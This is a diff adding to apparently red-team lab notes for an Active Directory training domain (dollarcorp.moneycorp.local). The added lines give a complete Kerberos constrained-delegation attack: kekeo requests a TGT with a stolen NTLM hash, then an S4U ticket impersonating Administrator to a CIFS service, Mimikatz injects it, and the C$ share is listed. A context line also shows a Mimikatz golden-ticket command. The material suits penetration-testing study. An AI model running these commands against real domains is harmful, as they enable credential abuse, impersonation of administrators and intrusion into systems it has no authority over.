@@ -678,3 +678,15 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 
 - Using ActiveDirectory module.
   - `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
+
+- Either plaintext password or NTLM hash is required. We already have access to websvc's hash from dcorp-adminsrv
+- Using asktgt from kekeo, we request a TGT.
+- `.\kekeo.exe`
+- `tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<NTLM-HASH>`
+
+- Using s4u from Kekeo, we request a TGS.
+- `tgs::s4u /tgt:<TGT GAINED FROM ABOVE> /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local`
+
+- Using mimikatz, inject the ticket.
+- `Invoke-Mimikatz -Command '"kerberos::ptt <TGS GAINED FROM ABOVE>"'`
+- `ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`
